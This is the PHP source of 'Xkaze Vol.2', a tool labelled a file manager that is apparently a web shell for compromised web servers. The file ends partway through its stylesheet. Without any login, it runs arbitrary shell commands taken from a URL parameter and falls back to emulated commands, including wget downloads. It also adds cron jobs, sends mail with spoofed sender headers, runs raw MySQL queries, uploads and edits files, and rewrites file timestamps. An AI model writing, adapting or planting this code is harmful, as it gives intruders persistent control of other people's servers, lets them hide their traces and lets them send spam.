<?php
// ══════════════════════════════════════════════════════
//  Xkaze Vol.2 — File Manager
// ══════════════════════════════════════════════════════
@error_reporting(0);
@ini_set('display_errors', 0);
session_start();

// ══ PHP MAILER ═══════════════════════════════════════
if(isset($_POST['send_mail'])){
    $to       = trim($_POST['mail_to']);
    $subject  = trim($_POST['mail_subject']);
    $body     = $_POST['mail_body'];
    $from     = trim($_POST['mail_from']);
    $fromName = trim($_POST['mail_from_name']);
    $isHtml   = isset($_POST['mail_html']);
    $method   = $_POST['mail_method'] ?? 'mail';

    $headers  = [];
    $headers[] = 'From: '.$fromName.' <'.$from.'>';
    $headers[] = 'Reply-To: '.$from;
    $headers[] = 'X-Mailer: PHP/'.phpversion();
    $headers[] = 'MIME-Version: 1.0';
    if($isHtml){
        $headers[] = 'Content-Type: text/html; charset=UTF-8';
    } else {
        $headers[] = 'Content-Type: text/plain; charset=UTF-8';
    }

    $ok = false;
    $errMsg = '';

    if($method === 'smtp'){
        // SMTP via socket
        $smtpHost = trim($_POST['smtp_host']);
        $smtpPort = intval($_POST['smtp_port'] ?? 587);
        $smtpUser = trim($_POST['smtp_user']);
        $smtpPass = trim($_POST['smtp_pass']);
        $smtpSec  = $_POST['smtp_sec'] ?? 'tls';

        try {
            $sock = fsockopen(
                ($smtpSec==='ssl'?'ssl://':'').$smtpHost,
                $smtpPort, $errno, $errstr, 15
            );
            if(!$sock) throw new Exception("Connect failed: $errstr ($errno)");

            if(!function_exists('smtpRead')){
                function smtpRead($s){ $r=''; while($l=fgets($s,512)){ $r.=$l; if(substr($l,3,1)===' ')break; } return $r; }
                function smtpCmd($s,$c){ fwrite($s,$c."
"); return smtpRead($s); }
            }

            smtpRead($sock); // banner
            smtpCmd($sock,"EHLO ".$smtpHost);
            if($smtpSec==='tls'){
                smtpCmd($sock,"STARTTLS");
                stream_socket_enable_crypto($sock,true,STREAM_CRYPTO_METHOD_TLS_CLIENT);
                smtpCmd($sock,"EHLO ".$smtpHost);
            }
            smtpCmd($sock,"AUTH LOGIN");
            smtpCmd($sock,base64_encode($smtpUser));
            $authResp = smtpCmd($sock,base64_encode($smtpPass));
            if(strpos($authResp,'235')===false) throw new Exception("Auth failed: ".$authResp);

            smtpCmd($sock,"MAIL FROM:<".$from.">");
            // support multiple recipients
            $recipients = array_map('trim', explode(',', $to));
            foreach($recipients as $r){ smtpCmd($sock,"RCPT TO:<".$r.">"); }
            smtpCmd($sock,"DATA");
            $msg  = "From: $fromName <$from>
";
            $msg .= "To: $to
";
            $msg .= "Subject: $subject
";
            $msg .= implode("
",$headers)."

";
            $msg .= $body."
.
";
            $resp = smtpCmd($sock,$msg);
            smtpCmd($sock,"QUIT");
            fclose($sock);
            if(strpos($resp,'250')!==false) $ok=true;
            else throw new Exception("Send failed: ".$resp);
        } catch(Exception $e){
            $errMsg = $e->getMessage();
        }
    } else {
        // PHP mail()
        $recipients = array_map('trim', explode(',', $to));
        $allOk = true;
        foreach($recipients as $r){
            if(!@mail($r, $subject, $body, implode("
",$headers))) $allOk=false;
        }
        $ok = $allOk;
        if(!$ok) $errMsg = 'mail() returned false — check server mail config';
    }

    if($ok){
        header("Location: ?path=".urlencode($_POST['path'])."&ok=mail_sent");
    } else {
        $_SESSION['mail_err'] = $errMsg;
        header("Location: ?path=".urlencode($_POST['path'])."&err=mail_failed");
    }
    exit;
}

// ══ HASH CHECKER ══════════════════════════════════════
if(isset($_GET['do']) && $_GET['do']==='hash'){
    $f = cleanPath($_GET['f'] ?? '');
    if(is_file($f)){
        header('Content-Type: application/json');
        echo json_encode([
            'ok'     => true,
            'name'   => basename($f),
            'size'   => filesize($f),
            'md5'    => md5_file($f),
            'sha1'   => sha1_file($f),
            'sha256' => hash_file('sha256',$f),
            'sha512' => hash_file('sha512',$f),
            'mime'   => mime_content_type($f),
        ]);
    } else {
        echo json_encode(['ok'=>false,'msg'=>'File not found']);
    }
    exit;
}

// ══ IP INFO ════════════════════════════════════════════
if(isset($_GET['do']) && $_GET['do']==='ipinfo'){
    $ip = trim($_GET['ip'] ?? $_SERVER['REMOTE_ADDR']);
    $data = @file_get_contents("http://ip-api.com/json/$ip?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query");
    header('Content-Type: application/json');
    echo $data ?: json_encode(['status'=>'fail','message'=>'Could not fetch']);
    exit;
}

// ══ MYSQL MANAGER ══════════════════════════════════════
if(isset($_GET['do']) && $_GET['do']==='mysql'){
    $action = $_GET['action'] ?? '';
    $host   = $_POST['db_host'] ?? $_GET['host'] ?? 'localhost';
    $user   = $_POST['db_user'] ?? $_GET['user'] ?? '';
    $pass   = $_POST['db_pass'] ?? $_GET['pass'] ?? '';
    $dbname = $_POST['db_name'] ?? $_GET['db']   ?? '';

    header('Content-Type: application/json');

    if(!extension_loaded('mysqli')){ echo json_encode(['ok'=>false,'msg'=>'mysqli extension not available']); exit; }

    $conn = @new mysqli($host, $user, $pass, $dbname ?: null);
    if($conn->connect_error){ echo json_encode(['ok'=>false,'msg'=>$conn->connect_error]); exit; }

    // List databases
    if($action==='dbs'){
        $r = $conn->query('SHOW DATABASES');
        $dbs=[];
        while($row=$r->fetch_row()) $dbs[]=$row[0];
        echo json_encode(['ok'=>true,'dbs'=>$dbs]);

    // List tables
    } elseif($action==='tables'){
        $conn->select_db($dbname);
        $r=$conn->query('SHOW TABLES');
        $tables=[];
        while($row=$r->fetch_row()) $tables[]=$row[0];
        echo json_encode(['ok'=>true,'tables'=>$tables]);

    // Run query
    } elseif($action==='query'){
        $sql = trim($_POST['sql'] ?? '');
        $conn->select_db($dbname);
        $r = $conn->query($sql);
        if($r === true){
            echo json_encode(['ok'=>true,'type'=>'exec','affected'=>$conn->affected_rows]);
        } elseif($r === false){
            echo json_encode(['ok'=>false,'msg'=>$conn->error]);
        } else {
            $cols=[];
            for($i=0;$i<$r->field_count;$i++) $cols[]=$r->fetch_field()->name;
            $rows=[];
            while($row=$r->fetch_assoc()) $rows[]=$row;
            echo json_encode(['ok'=>true,'type'=>'select','cols'=>$cols,'rows'=>$rows,'count'=>count($rows)]);
        }

    // Browse table
    } elseif($action==='browse'){
        $table = preg_replace('/[^a-zA-Z0-9_]/','',$_GET['table']??'');
        $page  = max(0,intval($_GET['page']??0));
        $limit = 50;
        $conn->select_db($dbname);
        $total = $conn->query("SELECT COUNT(*) FROM `$table`")->fetch_row()[0];
        $r     = $conn->query("SELECT * FROM `$table` LIMIT $limit OFFSET ".($page*$limit));
        $cols=[];
        for($i=0;$i<$r->field_count;$i++) $cols[]=$r->fetch_field()->name;
        $rows=[];
        while($row=$r->fetch_assoc()) $rows[]=$row;
        echo json_encode(['ok'=>true,'cols'=>$cols,'rows'=>$rows,'total'=>$total,'page'=>$page,'limit'=>$limit]);
    }

    $conn->close();
    exit;
}

// ══ ZIP / UNZIP ═══════════════════════════════════════

// Zip file/folder
if(isset($_POST['zip_target'])){
    $target  = cleanPath($_POST['zip_target']);
    $zipName = trim($_POST['zip_name']) ?: basename($target).'.zip';
    if(substr($zipName,-4)!=='.zip') $zipName .= '.zip';
    $zipPath = $path.'/'.$zipName;

    if(!class_exists('ZipArchive')){
        header("Location: ?path=".urlencode($path)."&err=zip_noext");
        exit;
    }

    $zip = new ZipArchive();
    if($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true){
        header("Location: ?path=".urlencode($path)."&err=zip_failed");
        exit;
    }

    if(is_file($target)){
        $zip->addFile($target, basename($target));
    } elseif(is_dir($target)){
        $base = basename($target);
        $iter = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        $zip->addEmptyDir($base);
        foreach($iter as $file){
            $rel = $base.DIRECTORY_SEPARATOR.$iter->getSubPathname();
            if($file->isDir()) $zip->addEmptyDir($rel);
            else $zip->addFile($file->getPathname(), $rel);
        }
    }
    $zip->close();
    header("Location: ?path=".urlencode($path)."&ok=zipped");
    exit;
}

// Unzip
if(isset($_POST['unzip_target'])){
    $target  = cleanPath($_POST['unzip_target']);
    $destDir = cleanPath($_POST['unzip_dest'] ?: $path);

    if(!class_exists('ZipArchive')){
        header("Location: ?path=".urlencode($path)."&err=zip_noext");
        exit;
    }
    if(!is_file($target)){
        header("Location: ?path=".urlencode($path)."&err=unzip_failed");
        exit;
    }

    $zip = new ZipArchive();
    if($zip->open($target) !== true){
        header("Location: ?path=".urlencode($path)."&err=unzip_failed");
        exit;
    }
    $zip->extractTo($destDir);
    $zip->close();
    header("Location: ?path=".urlencode($path)."&ok=unzipped");
    exit;
}

// ══ CRON JOB MANAGER ═════════════════════════════════

// List cron jobs
if(isset($_GET['do']) && $_GET['do']==='cron_list'){
    $out = [];
    $raw = shell_exec('crontab -l 2>/dev/null');
    if($raw){
        $lines = array_filter(explode("
", trim($raw)));
        foreach($lines as $i => $line){
            $line = trim($line);
            if($line==='' || $line[0]==='#') continue;
            $out[] = ['id'=>$i, 'line'=>$line];
        }
    }
    header('Content-Type: application/json');
    echo json_encode(['ok'=>true,'jobs'=>$out]);
    exit;
}

// Add cron job
if(isset($_POST['cron_add'])){
    $expr = trim($_POST['cron_expr']);
    $cmd  = trim($_POST['cron_cmd']);
    if($expr && $cmd){
        $newJob  = escapeshellarg("$expr $cmd");
        $current = shell_exec('crontab -l 2>/dev/null') ?: '';
        $current  = trim($current);
        $updated  = $current ? "$current
$expr $cmd" : "$expr $cmd";
        $tmpfile  = tempnam(sys_get_temp_dir(), 'cron');
        file_put_contents($tmpfile, $updated."
");
        $result = shell_exec("crontab $tmpfile 2>&1");
        unlink($tmpfile);
        header("Location: ?path=".urlencode($_POST['path'])."&ok=cron_added");
    } else {
        header("Location: ?path=".urlencode($_POST['path'])."&err=cron_invalid");
    }
    exit;
}

// Delete cron job
if(isset($_POST['cron_delete'])){
    $delLine = trim($_POST['cron_line']);
    $current = shell_exec('crontab -l 2>/dev/null') ?: '';
    $lines   = explode("
", trim($current));
    $lines   = array_filter($lines, function($l) use($delLine){ return trim($l)!==$delLine && trim($l)!==''; });
    $updated = implode("
", $lines);
    $tmpfile = tempnam(sys_get_temp_dir(), 'cron');
    file_put_contents($tmpfile, $updated ? $updated."
" : "");
    shell_exec("crontab $tmpfile 2>&1");
    unlink($tmpfile);
    header("Location: ?path=".urlencode($_POST['path'])."&ok=cron_deleted");
    exit;
}

// ── ROOT: titik awal navigation (bisa diubah manual) ──
// Kosongkan string ini untuk bebas navigate ke mana saja
// atau set ke path tertentu misal: '/home2/cofasa'
$JAIL = ''; // '' = bebas dari root /

function safe($s){ return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }

// ── Resolve path: simple, no realpath dependency ───────
function cleanPath($input){
    // Normalize
    $p = str_replace('\\', '/', trim($input));
    if($p === '') return '/';
    // Resolve . dan ..
    $parts = explode('/', $p);
    $out = [];
    foreach($parts as $seg){
        if($seg === '' || $seg === '.') continue;
        if($seg === '..'){
            if(!empty($out)) array_pop($out);
        } else {
            $out[] = $seg;
        }
    }
    return '/' . implode('/', $out);
}

function isAllowed($path, $JAIL){
    if($JAIL === '') return true; // bebas
    return strpos($path, $JAIL) === 0;
}

// ── Current path ───────────────────────────────────────
$rawPath = $_GET['path'] ?? dirname(__FILE__);
$path    = cleanPath($rawPath);
if(!is_dir($path)){
    $path = cleanPath(dirname(__FILE__));
}
if(!isAllowed($path, $JAIL)){
    $path = $JAIL ?: '/';
}

// ══ AJAX: Recursive search ════════════════════════════
if(isset($_GET['do']) && $_GET['do'] === 'search'){
    $q = trim($_GET['q'] ?? '');
    $results = [];
    function rSearch($dir, $q, &$out, $depth=0){
        if($depth > 6 || !is_dir($dir)) return;
        $items = @scandir($dir) ?: [];
        foreach($items as $i){
            if($i==='.'||$i==='..') continue;
            $full = rtrim($dir,'/').'/'.$i;
            if(stripos($i, $q) !== false){
                $out[] = [
                    'name'   => $i,
                    'path'   => $full,
                    'dir'    => $dir,
                    'is_dir' => is_dir($full),
                    'size'   => is_file($full) ? round(filesize($full)/1024,1) : null,
                    'mtime'  => date('Y-m-d H:i', filemtime($full)),
                ];
            }
            if(is_dir($full)) rSearch($full, $q, $out, $depth+1);
        }
    }
    if(strlen($q) >= 2) rSearch($path, $q, $results);
    header('Content-Type: application/json');
    echo json_encode($results);
    exit;
}

// ══ POST / GET Actions ════════════════════════════════

// Create folder
if(isset($_POST['newfolder']) && $_POST['newfolder'] !== ''){
    $t = $path.'/'.basename($_POST['newfolder']);
    @mkdir($t, 0755)
        ? header("Location: ?path=".urlencode($path)."&ok=folder_created")
        : header("Location: ?path=".urlencode($path)."&err=folder_failed");
    exit;
}

// Create file
if(isset($_POST['newfile']) && $_POST['newfile'] !== ''){
    $t = $path.'/'.basename($_POST['newfile']);
    @file_put_contents($t, '') !== false
        ? header("Location: ?path=".urlencode($path)."&ok=file_created")
        : header("Location: ?path=".urlencode($path)."&err=file_failed");
    exit;
}

// Upload
if(!empty($_FILES['upfile']['name'])){
    $d = $path.'/'.basename($_FILES['upfile']['name']);
    move_uploaded_file($_FILES['upfile']['tmp_name'], $d)
        ? header("Location: ?path=".urlencode($path)."&ok=uploaded")
        : header("Location: ?path=".urlencode($path)."&err=upload_failed");
    exit;
}

// Delete
if(isset($_GET['delete'])){
    $t  = cleanPath($_GET['delete']);
    $bk = '?path='.urlencode(cleanPath(dirname($t)));
    if(is_file($t))   { @unlink($t) ? header("Location: $bk&ok=deleted") : header("Location: $bk&err=delete_failed"); }
    elseif(is_dir($t)){ @rmdir($t)  ? header("Location: $bk&ok=deleted") : header("Location: $bk&err=delete_failed"); }
    exit;
}

// Rename
if(isset($_POST['rename_from'])){
    $old = cleanPath($_POST['rename_from']);
    $new = cleanPath(dirname($old).'/'.basename($_POST['rename_to']));
    $bk  = '?path='.urlencode(cleanPath(dirname($old)));
    @rename($old, $new)
        ? header("Location: $bk&ok=renamed")
        : header("Location: $bk&err=rename_failed");
    exit;
}

// Save edit
if(isset($_POST['edit_file'])){
    $f  = cleanPath($_POST['edit_file']);
    $bk = '?path='.urlencode(cleanPath(dirname($f)));
    @file_put_contents($f, $_POST['content']) !== false
        ? header("Location: $bk&ok=saved")
        : header("Location: $bk&err=save_failed");
    exit;
}

// Copy
if(isset($_POST['copy_from'], $_POST['copy_to'])){
    $src  = cleanPath($_POST['copy_from']);
    $dest = cleanPath($_POST['copy_to']);
    if(is_file($src) && is_dir($dest)){
        @copy($src, $dest.'/'.basename($src))
            ? header("Location: ?path=".urlencode($path)."&ok=copied")
            : header("Location: ?path=".urlencode($path)."&err=copy_failed");
    } else {
        header("Location: ?path=".urlencode($path)."&err=copy_failed");
    }
    exit;
}

// Move
if(isset($_POST['move_from'], $_POST['move_to'])){
    $src  = cleanPath($_POST['move_from']);
    $dest = cleanPath($_POST['move_to']);
    if(is_dir($dest)){
        @rename($src, $dest.'/'.basename($src))
            ? header("Location: ?path=".urlencode($path)."&ok=moved")
            : header("Location: ?path=".urlencode($path)."&err=move_failed");
    } else {
        header("Location: ?path=".urlencode($path)."&err=move_failed");
    }
    exit;
}

// Chmod
if(isset($_POST['chmod_path'], $_POST['chmod_val'])){
    $f = cleanPath($_POST['chmod_path']);
    @chmod($f, octdec($_POST['chmod_val']))
        ? header("Location: ?path=".urlencode($path)."&ok=perms_updated")
        : header("Location: ?path=".urlencode($path)."&err=perms_failed");
    exit;
}

// Timestamp
if(isset($_GET['update_time'], $_GET['fp'], $_GET['nt'])){
    $f  = cleanPath($_GET['fp']);
    $ts = strtotime($_GET['nt']);
    echo ($ts && @touch($f, $ts)) ? "ok" : "fail";
    exit;
}

// Download
if(isset($_GET['download'])){
    $f = cleanPath($_GET['download']);
    if(is_file($f)){
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($f).'"');
        header('Content-Length: '.filesize($f));
        @readfile($f);
    }
    exit;
}

// ══ Terminal — full Linux shell via shell_exec ═════════
if(isset($_GET['bash_cmd'])){
    $cmd = trim($_GET['bash_cmd']);
    $cwd = trim($_GET['cwd'] ?? getcwd());
    if(!is_dir($cwd)) $cwd = getcwd();

    if(!function_exists('o')){ function o($x){ echo nl2br(htmlspecialchars($x, ENT_QUOTES, 'UTF-8')); exit; } }

    if($cmd === 'clear') o('__CLEAR__');
    if($cmd === '') o('');

    // Cek apakah shell_exec / exec tersedia
    $hasShell = function_exists('shell_exec') && !in_array('shell_exec', array_map('trim', explode(',', ini_get('disable_functions'))));
    $hasExec  = function_exists('exec')       && !in_array('exec',       array_map('trim', explode(',', ini_get('disable_functions'))));

    if($hasShell || $hasExec){
        // cd special case — update cwd
        if(preg_match('/^cd\s*(.*)?$/', $cmd, $m)){
            $target = trim($m[1] ?? '');
            if($target === '' || $target === '~') $newCwd = $_SERVER['HOME'] ?? getcwd();
            elseif($target[0] === '/') $newCwd = $target;
            else $newCwd = $cwd.'/'.$target;
            $newCwd = realpath($newCwd) ?: $newCwd;
            if(is_dir($newCwd)){
                echo '__CWD__'.$newCwd;
            } else {
                echo nl2br(htmlspecialchars("bash: cd: $target: No such file or directory"));
            }
            exit;
        }

        // Run command in current working dir
        $fullCmd = 'cd '.escapeshellarg($cwd).' && '.$cmd.' 2>&1';

        if($hasShell){
            $out = shell_exec($fullCmd);
        } else {
            exec($fullCmd, $lines, $code);
            $out = implode("\n", $lines);
        }

        o($out !== null ? $out : '(no output)');
    }

    // Fallback PHP emulation kalau shell_exec disabled
    if($cmd === 'id'){
        $i = @posix_getpwuid(@posix_geteuid());
        o($i ? "uid={$i['uid']}({$i['name']}) gid={$i['gid']}({$i['name']}) groups={$i['gid']}({$i['name']})" : "id: unavailable");
    }
    if($cmd === 'whoami')   o(@get_current_user() ?: 'unknown');
    if($cmd === 'pwd')      o($cwd);
    if($cmd === 'hostname') o(@gethostname() ?: 'unknown');
    if($cmd === 'date')     o(date('D M j H:i:s T Y'));
    if($cmd === 'uname' || $cmd === 'uname -a') o(php_uname());
    if($cmd === 'php -v')   o('PHP '.phpversion().' ('.PHP_OS.')');
    if(in_array($cmd, ['ls','ls -la','ls -l'])){
        $items = @scandir($cwd) ?: [];
        $out = '';
        foreach($items as $i){
            if($i==='.'||$i==='..') continue;
            $f = $cwd.'/'.$i;
            if($cmd !== 'ls'){
                $perm = substr(sprintf('%o', @fileperms($f)), -4);
                $size = is_file($f) ? @filesize($f) : 0;
                $date = date('M d H:i', @filemtime($f));
                $type = is_dir($f) ? 'd' : '-';
                $out .= "$type$perm  1 www-data www-data  $size $date $i\n";
            } else {
                $out .= $i."\n";
            }
        }
        o($out ?: '(empty)');
    }
    if(strpos($cmd,'cat ')===0)  { $f=trim(substr($cmd,4)); o(is_file($f)?(@file_get_contents($f)?:''):"cat: $f: No such file or directory"); }
    if(strpos($cmd,'echo ')===0) o(substr($cmd,5));
    if(strpos($cmd,'mkdir ')===0){ $d=trim(substr($cmd,6)); @mkdir($d,0755,true); o(""); }
    if(strpos($cmd,'touch ')===0){ @file_put_contents(trim(substr($cmd,6)),''); o(""); }
    if(strpos($cmd,'rm ')===0){
        $f=trim(substr($cmd,3));
        if(strpos($f,'-rf ')===0||strpos($f,'-r ')===0) $f=trim(substr($f,strpos($f,' ')+1));
        @unlink($f)||@rmdir($f);
        o("");
    }
    if(strpos($cmd,'cp ')===0){
        preg_match('/cp\s+(\S+)\s+(\S+)/',$cmd,$m);
        if(isset($m[1],$m[2])) @copy($m[1],$m[2]);
        o("");
    }
    if(strpos($cmd,'mv ')===0){
        preg_match('/mv\s+(\S+)\s+(\S+)/',$cmd,$m);
        if(isset($m[1],$m[2])) @rename($m[1],$m[2]);
        o("");
    }
    if(strpos($cmd,'grep ')===0){
        preg_match('/grep\s+(?:-[a-z]+\s+)?"?([^"]+)"?\s+(\S+)/',$cmd,$m);
        if(isset($m[1],$m[2])&&is_file($cwd.'/'.$m[2])){
            $lines=file($cwd.'/'.$m[2]);$out='';
            foreach($lines as $n=>$l){ if(stripos($l,$m[1])!==false) $out.=($n+1).": ".$l; }
            o($out?:"(no match)");
        }
    }
    if(strpos($cmd,'wget ')===0){
        $url=trim(substr($cmd,5));
        $data=@file_get_contents($url,false,stream_context_create(['http'=>['method'=>'GET','header'=>"User-Agent: wget\r\n"]]));
        if(!$data) o("wget: failed to retrieve $url");
        $dest=$cwd.'/'.basename(parse_url($url,PHP_URL_PATH));
        o(@file_put_contents($dest,$data)?"saved → $dest":"write failed");
    }

    o("shell_exec is disabled on this server. Limited PHP fallback only.\nType 'help' for available commands.");
}


// ══ Dir listing ════════════════════════════════════════
$folders = $files = [];
foreach(@scandir($path) ?: [] as $i){
    if($i==='.'||$i==='..') continue;
    $f = $path.'/'.$i;
    is_dir($f) ? $folders[] = $i : $files[] = $i;
}
sort($folders); sort($files);

// ══ Breadcrumb: split path jadi segments clickable ═════
$path = rtrim($path, '/');
$bcSegments = array_values(array_filter(explode('/', $path)));
// bcSegments untuk /home2/cofasa/public_html → ['home2','cofasa','public_html']

// ══ Notif ══════════════════════════════════════════════
$nOk = ['folder_created'=>'Folder created!','file_created'=>'File created!','uploaded'=>'Uploaded!','deleted'=>'Deleted!','renamed'=>'Renamed!','saved'=>'Saved!','perms_updated'=>'Permissions updated!','copied'=>'Copied!','moved'=>'Moved!','cron_added'=>'Cron job added!','cron_deleted'=>'Cron job deleted!','mail_sent'=>'Email sent!','zipped'=>'Zipped!','unzipped'=>'Unzipped!'];
$nErr= ['folder_failed'=>'Could not create folder.','file_failed'=>'Could not create file.','upload_failed'=>'Upload failed.','delete_failed'=>'Delete failed.','rename_failed'=>'Rename failed.','save_failed'=>'Save failed.','perms_failed'=>'Perms failed.','copy_failed'=>'Copy failed.','move_failed'=>'Move failed.','zip_failed'=>'Zip failed.','unzip_failed'=>'Unzip failed.','zip_noext'=>'ZipArchive not available on this server.'];
$nMsg=''; $nType='';
if(isset($_GET['ok'])  && isset($nOk[$_GET['ok']]))  { $nMsg=$nOk[$_GET['ok']];  $nType='ok'; }
if(isset($_GET['err']) && isset($nErr[$_GET['err']])) { $nMsg=$nErr[$_GET['err']]; $nType='err'; }
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title><?=safe(basename($path))?></title>
<meta name="robots" content="noindex,nofollow">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#070910;--bg2:#0c0f18;--card:#0f1320;--card2:#141929;
  --line:#1c2235;--line2:#243050;
  --a1:#7c6dfa;--a2:#4fc8ff;--a3:#fa6d8a;--a4:#ffc46d;--a5:#57e59e;
  --txt:#dde3f0;--txt2:#8896b3;--txt3:#4e5f7a;
  --r:12px;--r2:8px;
  --mono:'JetBrains Mono',monospace;--sans:'Space Grotesk',sans-serif;
  --shadow:0 8px 32px rgba(0,0,0,.55);
  --g1:0 0 24px rgba(124,109,250,.2);
}
html{scroll-behavior:smooth}
body{background:var(--bg);color:var(--txt);font-family:var(--sans);font-size:13.5px;min-height:100vh;-webkit-font-smoothing:antialiased}
body::before{content:'';position:fixed;inset:0;pointer-events:none;z-index:0;
  background:radial-gradient(ellipse 70% 55% at 5% 0%,rgba(124,109,250,.07) 0%,transparent 65%),
             radial-gradient(ellipse 50% 45% at 95% 90%,rgba(79,200,255,.06) 0%,transparent 65%)}
body::after{content:'';position:fixed;inset:0;pointer-events:none;z-index:0;
  background-image:linear-gradient(var(--line) 1px,transparent 1px),linear-gradient(90deg,var(--line) 1px,transparent 1px);
  background-size:44px 44px;opacity:.14}

.shell{position:relative;z-index:1;max-width:1200px;margin:0 auto;padding:24px 20px 60px}

/* HEADER */
.header{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px;padding-bottom:18px;border-bottom:1px solid var(--line);gap:12px;flex-wrap:wrap}
.logo{display:flex;align-items:center;gap:12px;flex-shrink:0}
.logo-mark{display:none}
.logo-name{display:none}
.logo-tag{display:none}
/* XKAZE brand logo */
.xkaze-logo{
  display:flex;flex-direction:column;gap:2px;
  background:#181c27;border:1px solid var(--line2);
  border-left:3px solid var(--a2);
  border-radius:10px;padding:10px 18px 8px 16px;
  position:relative;user-select:none;
}
.xkaze-logo .xl-badge{
  position:absolute;top:8px;right:10px;
  font-size:10px;font-family:var(--mono);color:var(--a2);
  background:rgba(79,200,255,.1);border:1px solid rgba(79,200,255,.25);
  border-radius:5px;padding:2px 8px;letter-spacing:.5px;
}
.xkaze-logo .xl-name{
  font-family:var(--mono);font-size:22px;font-weight:400;
  color:#fff;letter-spacing:6px;text-transform:uppercase;
  line-height:1;display:flex;align-items:baseline;gap:0;
}
.xkaze-logo .xl-name .xl-dot{
  color:var(--a2);font-size:28px;line-height:.8;margin-left:1px;
}
.xkaze-logo .xl-copy{
  font-family:var(--mono);font-size:9px;color:var(--txt3);
  letter-spacing:4px;text-transform:lowercase;margin-top:3px;
}
.hdr-right{display:flex;gap:7px;flex-wrap:wrap}

/* SEARCH */
.swrap{position:relative;flex:1;min-width:200px;max-width:420px}
.swrap .si{position:absolute;left:13px;top:50%;transform:translateY(-50%);color:var(--txt3);font-size:12px;pointer-events:none;z-index:1;transition:color .2s}
#sinput{width:100%;padding:9px 40px 9px 37px;background:var(--card);border:1px solid var(--line2);border-radius:var(--r);color:var(--txt);font-family:var(--mono);font-size:12px;outline:none;transition:border .2s,box-shadow .2s}
#sinput:focus{border-color:var(--a1);box-shadow:var(--g1)}
#sclear{position:absolute;right:10px;top:50%;transform:translateY(-50%);display:none;background:none;border:none;color:var(--txt3);cursor:pointer;font-size:12px;padding:3px;z-index:2}
#sclear:hover{color:var(--a3)}
.sbadge{display:none;position:absolute;right:30px;top:50%;transform:translateY(-50%);font-size:9px;letter-spacing:1px;text-transform:uppercase;background:rgba(124,109,250,.15);color:var(--a1);padding:2px 6px;border-radius:20px;font-family:var(--mono);white-space:nowrap;z-index:2}
#sresults{display:none;position:absolute;top:calc(100% + 7px);left:0;right:0;background:var(--card2);border:1px solid var(--line2);border-radius:var(--r);box-shadow:var(--shadow);z-index:600;max-height:380px;overflow-y:auto}
#sresults.open{display:block}
.sr-hdr{display:flex;align-items:center;justify-content:space-between;padding:9px 14px;border-bottom:1px solid var(--line);font-size:11px;color:var(--txt2);font-family:var(--mono)}
.sr-hdr .cnt{color:var(--a1);font-weight:600}
.sr-row{display:flex;align-items:center;gap:11px;padding:9px 14px;border-bottom:1px solid var(--line);cursor:pointer;transition:background .12s;text-decoration:none}
.sr-row:last-child{border-bottom:none}
.sr-row:hover{background:rgba(124,109,250,.07)}
.sr-ico{font-size:15px;flex-shrink:0;width:20px;text-align:center}
.sr-info{flex:1;min-width:0}
.sr-name{font-size:12.5px;font-weight:500;color:var(--txt);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.sr-name mark{background:rgba(124,109,250,.28);color:var(--a1);border-radius:2px;padding:0 2px;font-style:normal}
.sr-path{font-size:10px;color:var(--txt3);font-family:var(--mono);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.sr-meta{font-size:10px;color:var(--txt3);font-family:var(--mono);text-align:right;flex-shrink:0}
.sr-empty{padding:28px;text-align:center;color:var(--txt3);font-size:12px;line-height:2.2}
.sr-spin-wrap{padding:22px;text-align:center}
.sr-spin{width:22px;height:22px;border:2px solid var(--line2);border-top-color:var(--a1);border-radius:50%;animation:spin 1s linear infinite;display:inline-block}

/* BREADCRUMB */
.bc{
  display:flex;align-items:center;gap:0;
  background:var(--card);border:1px solid var(--line);border-radius:var(--r);
  padding:0 8px;margin-bottom:13px;
  font-family:var(--mono);font-size:12px;
  overflow-x:auto;white-space:nowrap;
  scrollbar-width:none;
}
.bc::-webkit-scrollbar{display:none}
.bc-pre{color:var(--txt3);font-size:10px;letter-spacing:1px;text-transform:uppercase;padding:10px 8px 10px 6px;flex-shrink:0;border-right:1px solid var(--line);margin-right:4px}
.bc-seg{
  display:inline-flex;align-items:center;
  color:var(--a2);text-decoration:none;
  padding:10px 6px;border-radius:5px;
  transition:all .15s;flex-shrink:0;
}
.bc-seg:hover{color:#fff;background:rgba(79,200,255,.08)}
.bc-seg.cur{color:var(--txt);font-weight:500;pointer-events:none}
.bc-sep{color:var(--txt3);padding:0 2px;font-size:10px;flex-shrink:0;user-select:none}

/* BUTTONS */
.btn{display:inline-flex;align-items:center;gap:6px;padding:8px 14px;border-radius:var(--r2);border:1px solid var(--line2);background:var(--card);color:var(--txt2);font-family:var(--sans);font-size:12px;font-weight:500;cursor:pointer;transition:all .18s;text-decoration:none;white-space:nowrap}
.btn i{font-size:11px}
.btn:hover{border-color:var(--a1);color:var(--a1);background:rgba(124,109,250,.07);transform:translateY(-1px)}
.btn-primary{background:linear-gradient(135deg,var(--a1),var(--a2));border-color:transparent;color:#fff;font-weight:600}
.btn-primary:hover{opacity:.88;transform:translateY(-1px);color:#fff}
.btn-danger:hover{border-color:var(--a3);color:var(--a3);background:rgba(250,109,138,.07)}
.btn-term{border-color:rgba(124,109,250,.35);color:var(--a1)}
.btn-term:hover{box-shadow:var(--g1);background:rgba(124,109,250,.08)}

/* TOOLBAR */
.toolbar{display:flex;gap:7px;margin-bottom:13px;flex-wrap:wrap}

/* INLINE FORMS */
.iform{display:none;align-items:center;gap:8px;background:var(--card);border:1px solid var(--a1);border-radius:var(--r);padding:9px 13px;margin-bottom:10px;animation:fadeIn .18s ease}
